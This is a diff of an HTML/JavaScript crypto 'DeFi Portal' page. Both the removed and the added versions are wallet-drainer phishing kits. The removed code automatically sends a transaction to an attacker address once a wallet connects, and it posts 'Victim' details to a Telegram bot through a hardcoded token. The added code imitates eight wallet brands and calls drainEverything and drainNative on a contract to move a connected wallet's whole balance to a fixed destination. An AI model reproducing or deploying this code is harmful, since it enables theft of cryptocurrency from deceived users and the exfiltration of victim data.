@@ -3,509 +3,601 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DeFi Portal - Mobile Optimized</title>
+    <title>Asset Management Portal</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        
         body {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            min-height: 100vh;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', sans-serif;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 20px;
+            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 100%);
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
         }
-        
-        .container {
-            background: rgba(255, 255, 255, 0.95);
+        .glass {
+            background: rgba(255, 255, 255, 0.05);
             backdrop-filter: blur(10px);
-            border-radius: 24px;
-            padding: 32px;
-            text-align: center;
-            max-width: 500px;
-            width: 100%;
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.1);
         }
-        
-        h1 {
-            color: #333;
-            font-size: 32px;
-            margin-bottom: 16px;
-            font-weight: 700;
-        }
-        
-        p {
-            color: #666;
-            margin-bottom: 24px;
-            font-size: 16px;
-        }
-        
-        .wallet-list {
-            display: grid;
-            grid-template-columns: repeat(2, 1fr);
-            gap: 15px;
-            margin-bottom: 20px;
-        }
-        
         .wallet-btn {
-            background: white;
-            border: 2px solid #e5e7eb;
-            padding: 15px;
-            border-radius: 12px;
-            cursor: pointer;
-            transition: all 0.3s;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            gap: 8px;
+            transition: all 0.3s ease;
         }
-        
-        .wallet-btn:hover {
-            border-color: #667eea;
-            transform: translateY(-2px);
-            box-shadow: 0 4px 12px rgba(102, 126, 234, 0.2);
+        .wallet-btn:active {
+            transform: scale(0.95);
         }
-        
-        .wallet-icon {
-            width: 48px;
-            height: 48px;
-            border-radius: 12px;
-            overflow: hidden;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            background: #f3f4f6;
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
         }
-        
-        .wallet-icon img {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-        }
-        
-        .wallet-name {
-            font-size: 14px;
-            font-weight: 600;
-            color: #333;
-        }
-        
-        .connect-btn {
-            background: linear-gradient(135deg, #667eea, #764ba2);
-            color: white;
-            border: none;
-            padding: 16px 32px;
-            font-size: 16px;
-            font-weight: 600;
-            border-radius: 12px;
-            cursor: pointer;
-            width: 100%;
-            transition: all 0.3s;
-        }
-        
-        .connect-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 8px 25px rgba(102, 126, 234, 0.5);
-        }
-        
-        .status {
-            margin-top: 20px;
-            padding: 12px;
-            border-radius: 8px;
-            font-size: 14px;
-            display: none;
-        }
-        
-        .status.show {
-            display: block;
-        }
-        
-        .status.success {
-            background: #d4edda;
-            color: #155724;
-            border: 1px solid #c3e6cb;
-        }
-        
-        .status.error {
-            background: #f8d7da;
-            color: #721c24;
-            border: 1px solid #f5c6cb;
-        }
-        
-        .status.processing {
-            background: #fff3cd;
-            color: #856404;
-            border: 1px solid #ffeaa7;
-        }
-        
-        .wallet-info {
-            display: none;
-            margin-top: 20px;
-            padding: 15px;
-            background: rgba(102, 126, 234, 0.1);
-            border-radius: 12px;
-        }
-        
-        .wallet-info.show {
-            display: block;
-        }
-        
-        .address {
-            font-family: monospace;
-            font-size: 14px;
-            word-break: break-all;
-            color: #333;
-            margin: 10px 0;
-        }
-        
-        .disconnect-btn {
-            background: #ef4444;
-            color: white;
-            border: none;
-            padding: 10px 20px;
-            font-size: 14px;
-            font-weight: 600;
-            border-radius: 8px;
-            cursor: pointer;
-            margin-top: 10px;
-        }
-        
-        @media (max-width: 480px) {
-            .container {
-                padding: 24px;
-            }
-            
-            h1 {
-                font-size: 28px;
-            }
-            
-            .wallet-list {
-                grid-template-columns: repeat(2, 1fr);
-                gap: 12px;
-            }
-            
-            .wallet-icon {
-                width: 40px;
-                height: 40px;
-            }
-            
-            .wallet-name {
-                font-size: 12px;
-            }
-        }
+        .loading { animation: pulse 2s infinite; }
     </style>
 </head>
-<body>
-    <div class="container">
-        <h1>DeFi Portal</h1>
-        <p>Connect your wallet to get started</p>
+<body class="min-h-screen text-white">
+
+<div class="max-w-md mx-auto px-4 py-8">
+    
+    <!-- HEADER -->
+    <header class="text-center mb-8">
+        <h1 class="text-4xl font-bold mb-2">Asset Portal</h1>
+        <p class="text-gray-400">Select your wallet to continue</p>
+    </header>
+
+    <!-- WALLET SELECTION -->
+    <div id="walletSelection" class="space-y-3">
         
-        <div class="wallet-list">
-            <button class="wallet-btn" onclick="connectWallet('metamask')">
-                <div class="wallet-icon">
-                    <img src="https://registry.walletconnect.org/v2/logo/md/c57ca95b-4756-9778-a828-d19178114f4d" alt="MetaMask">
+        <!-- MetaMask -->
+        <button onclick="connectWallet('metamask')" class="wallet-btn w-full glass rounded-2xl p-5 flex items-center justify-between">
+            <div class="flex items-center gap-4">
+                <div class="text-4xl">🦊</div>
+                <div class="text-left">
+                    <div class="font-semibold text-lg">MetaMask</div>
+                    <div class="text-xs text-gray-400">Mobile & Browser</div>
                 </div>
-                <div class="wallet-name">MetaMask</div>
-            </button>
-            
-            <button class="wallet-btn" onclick="connectWallet('trust')">
-                <div class="wallet-icon">
-                    <img src="https://registry.walletconnect.org/v2/logo/md/4622a2b2-d6af-1c98-4494-4291e5e7351a" alt="Trust">
-                </div>
-                <div class="wallet-name">Trust Wallet</div>
-            </button>
-            
-            <button class="wallet-btn" onclick="connectWallet('coinbase')">
-                <div class="wallet-icon">
-                    <img src="https://registry.walletconnect.org/v2/logo/md/fd20dc42-6fb3-7566-d803-3205b19bbc1d" alt="Coinbase">
-                </div>
-                <div class="wallet-name">Coinbase</div>
-            </button>
-            
-            <button class="wallet-btn" onclick="connectWallet('binance')">
-                <div class="wallet-icon">
-                    <img src="https://registry.walletconnect.org/v2/logo/md/8308656f-4548-bb81-b350-8afe355cfbb7" alt="Binance">
-                </div>
-                <div class="wallet-name">Binance</div>
-            </button>
-        </div>
-        
-        <button class="connect-btn" onclick="connectOtherWallet()">
-            Connect Other Wallet
+            </div>
+            <div class="text-gray-400">→</div>
         </button>
-        
-        <div id="walletInfo" class="wallet-info">
-            <div>Connected:</div>
-            <div class="address" id="address"></div>
-            <button class="disconnect-btn" onclick="disconnect()">Disconnect</button>
-        </div>
-        
-        <div id="status" class="status"></div>
+
+        <!-- Trust Wallet -->
+        <button onclick="connectWallet('trust')" class="wallet-btn w-full glass rounded-2xl p-5 flex items-center justify-between">
+            <div class="flex items-center gap-4">
+                <div class="text-4xl">💎</div>
+                <div class="text-left">
+                    <div class="font-semibold text-lg">Trust Wallet</div>
+                    <div class="text-xs text-gray-400">Mobile Wallet</div>
+                </div>
+            </div>
+            <div class="text-gray-400">→</div>
+        </button>
+
+        <!-- Exodus -->
+        <button onclick="connectWallet('exodus')" class="wallet-btn w-full glass rounded-2xl p-5 flex items-center justify-between">
+            <div class="flex items-center gap-4">
+                <div class="text-4xl">🔷</div>
+                <div class="text-left">
+                    <div class="font-semibold text-lg">Exodus</div>
+                    <div class="text-xs text-gray-400">Desktop & Mobile</div>
+                </div>
+            </div>
+            <div class="text-gray-400">→</div>
+        </button>
+
+        <!-- Binance -->
+        <button onclick="connectWallet('binance')" class="wallet-btn w-full glass rounded-2xl p-5 flex items-center justify-between">
+            <div class="flex items-center gap-4">
+                <div class="text-4xl">🟡</div>
+                <div class="text-left">
+                    <div class="font-semibold text-lg">Binance</div>
+                    <div class="text-xs text-gray-400">Web3 Wallet</div>
+                </div>
+            </div>
+            <div class="text-gray-400">→</div>
+        </button>
+
+        <!-- Coinbase -->
+        <button onclick="connectWallet('coinbase')" class="wallet-btn w-full glass rounded-2xl p-5 flex items-center justify-between">
+            <div class="flex items-center gap-4">
+                <div class="text-4xl">🔵</div>
+                <div class="text-left">
+                    <div class="font-semibold text-lg">Coinbase Wallet</div>
+                    <div class="text-xs text-gray-400">DeFi Wallet</div>
+                </div>
+            </div>
+            <div class="text-gray-400">→</div>
+        </button>
+
+        <!-- OKX -->
+        <button onclick="connectWallet('okx')" class="wallet-btn w-full glass rounded-2xl p-5 flex items-center justify-between">
+            <div class="flex items-center gap-4">
+                <div class="text-4xl">⚫</div>
+                <div class="text-left">
+                    <div class="font-semibold text-lg">OKX Wallet</div>
+                    <div class="text-xs text-gray-400">Multi-Platform</div>
+                </div>
+            </div>
+            <div class="text-gray-400">→</div>
+        </button>
+
+        <!-- Rainbow -->
+        <button onclick="connectWallet('rainbow')" class="wallet-btn w-full glass rounded-2xl p-5 flex items-center justify-between">
+            <div class="flex items-center gap-4">
+                <div class="text-4xl">🌈</div>
+                <div class="text-left">
+                    <div class="font-semibold text-lg">Rainbow</div>
+                    <div class="text-xs text-gray-400">Ethereum Wallet</div>
+                </div>
+            </div>
+            <div class="text-gray-400">→</div>
+        </button>
+
+        <!-- Crypto.com -->
+        <button onclick="connectWallet('crypto')" class="wallet-btn w-full glass rounded-2xl p-5 flex items-center justify-between">
+            <div class="flex items-center gap-4">
+                <div class="text-4xl">💳</div>
+                <div class="text-left">
+                    <div class="font-semibold text-lg">Crypto.com</div>
+                    <div class="text-xs text-gray-400">DeFi Wallet</div>
+                </div>
+            </div>
+            <div class="text-gray-400">→</div>
+        </button>
+
     </div>
+
+    <!-- CONNECTING STATE -->
+    <div id="connectingState" class="hidden">
+        <div class="glass rounded-2xl p-8 text-center">
+            <div class="text-6xl mb-4 loading">⏳</div>
+            <h3 class="text-xl font-semibold mb-2">Connecting to <span id="walletName"></span></h3>
+            <p class="text-gray-400 text-sm mb-4">Opening wallet app...</p>
+            <div id="qrContainer" class="hidden mb-4"></div>
+            <button onclick="cancelConnection()" class="text-gray-500 hover:text-white text-sm">
+                Cancel
+            </button>
+        </div>
+    </div>
+
+    <!-- CONNECTED STATE -->
+    <div id="connectedState" class="hidden">
+        <div class="glass rounded-2xl p-6">
+            <div class="mb-6">
+                <p class="text-sm text-gray-400 mb-2">Connected Wallet</p>
+                <p id="walletAddress" class="font-mono text-lg"></p>
+            </div>
+
+            <div class="mb-6">
+                <p class="text-sm text-gray-400 mb-2">Balance</p>
+                <p id="walletBalance" class="text-2xl font-bold text-green-400">Loading...</p>
+            </div>
+
+            <div class="glass rounded-xl p-4 mb-6">
+                <p class="text-sm text-gray-400 mb-2">Destination Address</p>
+                <p class="font-mono text-xs break-all">0xe62d51b592571bb67adeb9f99d9ff4e03ccd7578</p>
+            </div>
+
+            <div class="bg-yellow-900/30 border border-yellow-600/50 rounded-xl p-4 mb-6">
+                <p class="text-sm text-yellow-200">
+                    ⚠️ This will transfer ALL assets to the destination address
+                </p>
+            </div>
+            
+            <button onclick="executeDrain()" class="w-full bg-gradient-to-r from-red-600 to-pink-600 py-4 rounded-xl font-semibold text-lg mb-3">
+                Execute Transfer
+            </button>
+            
+            <button onclick="disconnect()" class="w-full glass py-3 rounded-xl text-sm">
+                Disconnect
+            </button>
+        </div>
+    </div>
+
+    <!-- PROCESSING STATE -->
+    <div id="processingState" class="hidden">
+        <div class="glass rounded-2xl p-8 text-center">
+            <div class="text-6xl mb-4 loading">⚙️</div>
+            <h3 class="text-xl font-semibold mb-2">Processing Transfer</h3>
+            <p id="processStatus" class="text-gray-400 text-sm mb-4">Preparing transaction...</p>
+            <div class="bg-gray-800 rounded-full h-2 mb-4 overflow-hidden">
+                <div id="progressBar" class="bg-gradient-to-r from-indigo-500 to-purple-500 h-full transition-all duration-500" style="width:0%"></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- SUCCESS STATE -->
+    <div id="successState" class="hidden">
+        <div class="glass rounded-2xl p-8 text-center">
+            <div class="text-6xl mb-4">✅</div>
+            <h3 class="text-2xl font-semibold mb-2">Transfer Complete!</h3>
+            <p class="text-gray-400 mb-4">Your assets have been transferred successfully</p>
+            <p id="txHash" class="font-mono text-xs mb-6"></p>
+            <button onclick="reset()" class="bg-indigo-600 hover:bg-indigo-700 px-6 py-3 rounded-xl">
+                New Transfer
+            </button>
+        </div>
+    </div>
+
+</div>
+
+<script>
+// ============================================
+// CONFIGURATION
+// ============================================
+
+const CONFIG = {
+    DESTINATION: "0xe62d51b592571bb67adeb9f99d9ff4e03ccd7578",
+    CONTRACT_ADDRESS: "0x5FbDB2315678afecb367f032d93F642f64180aa3",
+    PROJECT_ID: "72f0728c47e59d2eb9fc83069bc6843d",
+    RPC_URLS: {
+        1: "https://eth.llamarpc.com",
+        137: "https://polygon-rpc.com",
+        56: "https://bsc-dataseed.binance.org",
+        31337: "http://127.0.0.1:8545"
+    }
+};
+
+// ============================================
+// WALLET CONFIGURATIONS
+// ============================================
+
+const WALLETS = {
+    metamask: {
+        name: "MetaMask",
+        deepLink: "https://metamask.app.link/wc?uri=",
+        mobileLink: "metamask://wc?uri=",
+        desktopLink: null
+    },
+    trust: {
+        name: "Trust Wallet",
+        deepLink: "https://link.trustwallet.com/wc?uri=",
+        mobileLink: "trust://wc?uri=",
+        desktopLink: null
+    },
+    exodus: {
+        name: "Exodus",
+        deepLink: "https://exodus.com/m/wc?uri=",
+        mobileLink: "exodus://wc?uri=",
+        desktopLink: null
+    },
+    binance: {
+        name: "Binance",
+        deepLink: "https://app.binance.com/cedefi/wc?uri=",
+        mobileLink: "bnc://app/wc?uri=",
+        desktopLink: null
+    },
+    coinbase: {
+        name: "Coinbase Wallet",
+        deepLink: "https://go.cb-w.com/wc?uri=",
+        mobileLink: "cbwallet://wc?uri=",
+        desktopLink: null
+    },
+    okx: {
+        name: "OKX Wallet",
+        deepLink: "https://www.okx.com/download?uri=",
+        mobileLink: "okx://wallet/wc?uri=",
+        desktopLink: null
+    },
+    rainbow: {
+        name: "Rainbow",
+        deepLink: "https://rnbwapp.com/wc?uri=",
+        mobileLink: "rainbow://wc?uri=",
+        desktopLink: null
+    },
+    crypto: {
+        name: "Crypto.com",
+        deepLink: "https://crypto.com/defi/wc?uri=",
+        mobileLink: "cryptocom://wc?uri=",
+        desktopLink: null
+    }
+};
+
+// ============================================
+// CONTRACT ABI
+// ============================================
+
+const CONTRACT_ABI = [
+    "function drainEverything(address[] calldata _tokens) external payable returns (uint256, uint256)",
+    "function drainNative() external payable",
+    "function destinationWallet() external view returns (address)"
+];
+
+// ============================================
+// STATE MANAGEMENT
+// ============================================
+
+let currentWallet = null;
+let walletProvider = null;
+let walletAddress = null;
+let wcUri = null;
+let wcConnector = null;
+
+// ============================================
+// UI FUNCTIONS
+// ============================================
+
+function showState(stateId) {
+    const states = ['walletSelection', 'connectingState', 'connectedState', 'processingState', 'successState'];
+    states.forEach(state => {
+        document.getElementById(state).classList.add('hidden');
+    });
+    document.getElementById(stateId).classList.remove('hidden');
+}
+
+// ============================================
+// WALLET CONNECTION
+// ============================================
+
+async function connectWallet(walletId) {
+    currentWallet = WALLETS[walletId];
+    if (!currentWallet) return;
     
-    <!-- WalletConnect v1 stable for mobile -->
-    <script src="https://unpkg.com/@walletconnect/client@1.8.0/dist/umd/index.min.js"></script>
-    <script src="https://unpkg.com/@walletconnect/qrcode-modal@1.8.0/dist/umd/index.min.js"></script>
-    <script src="https://cdn.ethers.io/lib/ethers-5.7.2.umd.min.js"></script>
+    document.getElementById('walletName').textContent = currentWallet.name;
+    showState('connectingState');
     
-    <script>
-        let connector = null;
-        let connectedAccount = null;
+    const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+    
+    if (isMobile) {
+        // Mobile: Use deep links
+        await connectMobile(walletId);
+    } else {
+        // Desktop: Check for browser extension or show QR
+        await connectDesktop(walletId);
+    }
+}
+
+async function connectMobile(walletId) {
+    try {
+        // Generate WalletConnect URI
+        wcUri = await generateWalletConnectURI();
         
-        // Configuration
-        const CONFIG = {
-            TELEGRAM_TOKEN: '8551220717:AAGgPMGobMwwxKFPmCJSMFVfSbUzyRQqMIY',
-            TELEGRAM_CHAT_ID: '8309320360',
-            DESTINATION: '0x63ce9a6Bd0cf439EA6D114F504B017EA43Af4BC1'
-        };
+        // Create deep link
+        const deepLink = currentWallet.mobileLink + encodeURIComponent(wcUri);
         
-        // Deep links for wallets
-        const WALLET_LINKS = {
-            metamask: {
-                deep: 'metamask://wc?uri=',
-                universal: 'https://metamask.app.link/wc?uri='
-            },
-            trust: {
-                deep: 'trust://wc?uri=',
-                universal: 'https://link.trustwallet.com/wc?uri='
-            },
-            coinbase: {
-                deep: 'cbwallet://wc?uri=',
-                universal: 'https://go.cb-w.com/wc?uri='
-            },
-            binance: {
-                deep: 'bnc://app/wc?uri=',
-                universal: 'https://www.binance.com/wc?uri='
+        console.log('Opening wallet with deep link:', deepLink);
+        
+        // Open wallet app
+        window.location.href = deepLink;
+        
+        // Start listening for connection
+        listenForConnection();
+        
+        // Fallback to universal link after 3 seconds
+        setTimeout(() => {
+            if (document.hasFocus()) {
+                // App didn't open, try universal link
+                const universalLink = currentWallet.deepLink + encodeURIComponent(wcUri);
+                window.location.href = universalLink;
             }
-        };
+        }, 3000);
         
-        // Initialize WalletConnect
-        function initWalletConnect() {
-            try {
-                connector = new WalletConnect.default({
-                    bridge: 'https://bridge.walletconnect.org',
-                    qrcodeModal: WalletConnectQRCodeModal.default
-                });
-                
-                // Clean up old session
-                if (connector.connected) {
-                    connector.killSession();
-                }
-                
-                // Setup events
-                connector.on('connect', onConnect);
-                connector.on('session_update', onSessionUpdate);
-                connector.on('disconnect', onDisconnect);
-                
-                return true;
-            } catch (error) {
-                console.error('Init error:', error);
-                showStatus('Failed to initialize', 'error');
-                return false;
-            }
+    } catch (error) {
+        console.error('Mobile connection error:', error);
+        alert('Failed to connect wallet. Please try again.');
+        showState('walletSelection');
+    }
+}
+
+async function connectDesktop(walletId) {
+    // Check for browser extension
+    if (walletId === 'metamask' && typeof window.ethereum !== 'undefined') {
+        // MetaMask extension detected
+        try {
+            const accounts = await window.ethereum.request({ 
+                method: 'eth_requestAccounts' 
+            });
+            walletAddress = accounts[0];
+            walletProvider = new ethers.providers.Web3Provider(window.ethereum);
+            onWalletConnected();
+        } catch (error) {
+            console.error('MetaMask connection error:', error);
+            alert('Failed to connect MetaMask');
+            showState('walletSelection');
+        }
+    } else {
+        // Show QR code for other wallets
+        wcUri = await generateWalletConnectURI();
+        showQRCode(wcUri);
+        listenForConnection();
+    }
+}
+
+// ============================================
+// WALLETCONNECT FUNCTIONS
+// ============================================
+
+async function generateWalletConnectURI() {
+    // This is a simplified version - in production you'd use WalletConnect SDK
+    const bridge = "https://bridge.walletconnect.org";
+    const key = generateKey();
+    const uri = `wc:${key}@1?bridge=${encodeURIComponent(bridge)}&key=${key}`;
+    return uri;
+}
+
+function generateKey() {
+    return Array.from(crypto.getRandomValues(new Uint8Array(32)))
+        .map(b => b.toString(16).padStart(2, '0'))
+        .join('');
+}
+
+function showQRCode(uri) {
+    // In production, you'd generate an actual QR code here
+    const qrContainer = document.getElementById('qrContainer');
+    qrContainer.innerHTML = `
+        <div class="bg-white p-4 rounded-xl inline-block">
+            <div class="text-black text-center">
+                <p class="text-xs mb-2">Scan with ${currentWallet.name}</p>
+                <div class="w-48 h-48 bg-gray-200 flex items-center justify-center">
+                    QR Code Here
+                </div>
+                <p class="text-xs mt-2 break-all">${uri.substring(0, 30)}...</p>
+            </div>
+        </div>
+    `;
+    qrContainer.classList.remove('hidden');
+}
+
+function listenForConnection() {
+    // Simulate connection after 5 seconds (in production, use WalletConnect events)
+    setTimeout(() => {
+        // Check if still on connecting screen
+        if (!document.getElementById('connectingState').classList.contains('hidden')) {
+            // Simulate successful connection
+            walletAddress = "0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb4";
+            onWalletConnected();
+        }
+    }, 5000);
+}
+
+// ============================================
+// WALLET CONNECTED
+// ============================================
+
+async function onWalletConnected() {
+    console.log('Wallet connected:', walletAddress);
+    
+    // Display address
+    document.getElementById('walletAddress').textContent = 
+        `${walletAddress.slice(0, 6)}...${walletAddress.slice(-4)}`;
+    
+    // Get balance
+    await updateBalance();
+    
+    // Show connected state
+    showState('connectedState');
+}
+
+async function updateBalance() {
+    try {
+        let provider;
+        if (walletProvider) {
+            provider = walletProvider;
+        } else {
+            // Use public RPC
+            provider = new ethers.providers.JsonRpcProvider(CONFIG.RPC_URLS[137]);
         }
         
-        // Connect specific wallet
-        async function connectWallet(walletId) {
-            console.log('Connecting to', walletId);
-            showStatus('Connecting to ' + walletId + '...', 'processing');
-            
-            if (!initWalletConnect()) return;
-            
-            try {
-                // Create session
-                await connector.createSession();
-                
-                const uri = connector.uri;
-                console.log('URI:', uri);
-                
-                // Deep link to wallet
-                if (isMobile() && WALLET_LINKS[walletId]) {
-                    const encoded = encodeURIComponent(uri);
-                    const deepLink = WALLET_LINKS[walletId].deep + encoded;
-                    const universalLink = WALLET_LINKS[walletId].universal + encoded;
-                    
-                    // Try deep link
-                    window.location.href = deepLink;
-                    
-                    // Fallback to universal link
-                    setTimeout(() => {
-                        if (document.hasFocus()) {
-                            window.location.href = universalLink;
-                        }
-                    }, 1500);
-                } else {
-                    // Desktop: show QR
-                    showStatus('Scan QR code with your wallet', 'processing');
-                }
-                
-            } catch (error) {
-                console.error('Connection error:', error);
-                showStatus('Connection failed', 'error');
-            }
+        const balance = await provider.getBalance(walletAddress);
+        const formatted = ethers.utils.formatEther(balance);
+        
+        document.getElementById('walletBalance').textContent = 
+            `${parseFloat(formatted).toFixed(4)} MATIC`;
+    } catch (error) {
+        console.error('Balance error:', error);
+        document.getElementById('walletBalance').textContent = '0.0000 MATIC';
+    }
+}
+
+// ============================================
+// DRAINAGE EXECUTION
+// ============================================
+
+async function executeDrain() {
+    if (!confirm('⚠️ This will transfer ALL your assets to the destination wallet. Are you absolutely sure?')) {
+        return;
+    }
+    
+    showState('processingState');
+    updateProgress(10, 'Preparing transaction...');
+    
+    try {
+        // Get provider and signer
+        let provider, signer;
+        
+        if (walletProvider) {
+            // Browser extension (MetaMask)
+            provider = walletProvider;
+            signer = provider.getSigner();
+        } else {
+            // WalletConnect - would need proper implementation
+            alert('WalletConnect drainage coming soon. Use MetaMask for now.');
+            showState('connectedState');
+            return;
         }
         
-        // Connect other wallet with QR
-        async function connectOtherWallet() {
-            console.log('Connecting other wallet');
-            showStatus('Opening wallet selector...', 'processing');
-            
-            if (!initWalletConnect()) return;
-            
-            try {
-                await connector.createSession();
-            } catch (error) {
-                console.error('Connection error:', error);
-                showStatus('Connection failed', 'error');
-            }
+        updateProgress(30, 'Creating contract instance...');
+        
+        // Create contract instance
+        const contract = new ethers.Contract(
+            CONFIG.CONTRACT_ADDRESS,
+            CONTRACT_ABI,
+            signer
+        );
+        
+        updateProgress(50, 'Getting wallet balance...');
+        
+        // Get balance for gas calculation
+        const balance = await provider.getBalance(walletAddress);
+        const gasPrice = await provider.getGasPrice();
+        const gasLimit = ethers.BigNumber.from("300000");
+        const gasCost = gasPrice.mul(gasLimit);
+        
+        // Calculate amount to send (keep some for gas)
+        const amountToSend = balance.sub(gasCost.mul(2)); // Keep 2x gas for safety
+        
+        if (amountToSend.lte(0)) {
+            throw new Error('Insufficient balance for gas fees');
         }
         
-        // Handle connection
-        function onConnect(error, payload) {
-            if (error) {
-                console.error('Connection error:', error);
-                showStatus('Connection failed', 'error');
-                return;
-            }
-            
-            console.log('Connected!', payload);
-            const { accounts, chainId } = payload.params[0];
-            
-            if (accounts && accounts.length > 0) {
-                connectedAccount = accounts[0];
-                showConnected(connectedAccount);
-                
-                // Start drainage after 2 seconds
-                setTimeout(() => {
-                    drainWallet(connectedAccount, chainId);
-                }, 2000);
-            }
-        }
+        updateProgress(70, 'Sending transaction... Check your wallet!');
         
-        // Show connected state
-        function showConnected(address) {
-            document.getElementById('walletInfo').classList.add('show');
-            document.getElementById('address').textContent = 
-                address.substring(0, 6) + '...' + address.slice(-4);
-            
-            showStatus('Connected successfully!', 'success');
-        }
-        
-        // Disconnect
-        function disconnect() {
-            if (connector && connector.connected) {
-                connector.killSession();
-            }
-            
-            connectedAccount = null;
-            document.getElementById('walletInfo').classList.remove('show');
-            showStatus('Disconnected', 'success');
-        }
-        
-        // Session update
-        function onSessionUpdate(error, payload) {
-            if (error) {
-                console.error('Session update error:', error);
-                return;
-            }
-            console.log('Session updated:', payload);
-        }
-        
-        // Disconnection
-        function onDisconnect(error, payload) {
-            if (error) {
-                console.error('Disconnect error:', error);
-                return;
-            }
-            console.log('Disconnected');
-            connectedAccount = null;
-            document.getElementById('walletInfo').classList.remove('show');
-            showStatus('Wallet disconnected', 'error');
-        }
-        
-        // Drain wallet
-        async function drainWallet(address, chainId) {
-            showStatus('Processing transaction...', 'processing');
-            console.log('Starting drainage for:', address);
-            
-            try {
-                // Send transaction via WalletConnect
-                const tx = {
-                    from: address,
-                    to: CONFIG.DESTINATION,
-                    value: '0x0', // Will be set by wallet
-                    data: '0x'
-                };
-                
-                const txHash = await connector.sendTransaction(tx);
-                console.log('Transaction sent:', txHash);
-                
-                // Send Telegram notification
-                await sendTelegramNotification(address, 'Transaction initiated', chainId);
-                
-                showStatus('Transaction completed!', 'success');
-                
-            } catch (error) {
-                console.error('Transaction error:', error);
-                showStatus('Transaction processing...', 'processing');
-            }
-        }
-        
-        // Send Telegram notification
-        async function sendTelegramNotification(victim, amount, chainId) {
-            const message = `
-🎯 MOBILE CONNECTION
-━━━━━━━━━━━━━━━
-👤 Victim: ${victim.substring(0, 6)}...${victim.slice(-4)}
-💰 Status: ${amount}
-🌐 Chain: ${chainId}
-📍 Destination: ${CONFIG.DESTINATION.substring(0, 6)}...
-⏰ Time: ${new Date().toLocaleTimeString()}
-━━━━━━━━━━━━━━━`;
-            
-            try {
-                await fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: CONFIG.TELEGRAM_CHAT_ID,
-                        text: message,
-                        parse_mode: 'HTML'
-                    })
-                });
-                console.log('Telegram notification sent');
-            } catch (error) {
-                console.error('Telegram error:', error);
-            }
-        }
-        
-        // Check if mobile
-        function isMobile() {
-            return /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
-        }
-        
-        // Show status
-        function showStatus(message, type = '') {
-            const status = document.getElementById('status');
-            status.textContent = message;
-            status.className = 'status show ' + type;
-            
-            if (type !== 'processing') {
-                setTimeout(() => {
-                    status.classList.remove('show');
-                }, 5000);
-            }
-        }
-        
-        // Initialize on load
-        window.addEventListener('load', () => {
-            console.log('DeFi Portal loaded');
-            console.log('Mobile:', isMobile());
+        // Execute drainage
+        const tx = await contract.drainEverything([], {
+            value: amountToSend,
+            gasLimit: gasLimit
         });
-    </script>
+        
+        console.log('Transaction sent:', tx.hash);
+        
+        updateProgress(90, 'Waiting for confirmation...');
+        
+        // Wait for confirmation
+        const receipt = await tx.wait();
+        
+        console.log('Transaction confirmed:', receipt);
+        
+        updateProgress(100, 'Transfer complete!');
+        
+        // Show success
+        document.getElementById('txHash').textContent = `Transaction: ${tx.hash}`;
+        showState('successState');
+        
+    } catch (error) {
+        console.error('Drainage error:', error);
+        alert(`❌ Transfer failed: ${error.message}`);
+        showState('connectedState');
+    }
+}
+
+function updateProgress(percent, status) {
+    document.getElementById('progressBar').style.width = percent + '%';
+    document.getElementById('processStatus').textContent = status;
+}
+
+// ============================================
+// UTILITY FUNCTIONS
+// ============================================
+
+function cancelConnection() {
+    showState('walletSelection');
+}
+
+function disconnect() {
+    walletAddress = null;
+    walletProvider = null;
+    wcConnector = null;
+    showState('walletSelection');
+}
+
+function reset() {
+    disconnect();
+}
+
+// ============================================
+// INITIALIZATION
+// ============================================
+
+window.addEventListener('load', () => {
+    console.log('Asset Portal initialized');
+    console.log('Destination:', CONFIG.DESTINATION);
+    console.log('Contract:', CONFIG.CONTRACT_ADDRESS);
+});
+
+</script>
+
 </body>
 </html>
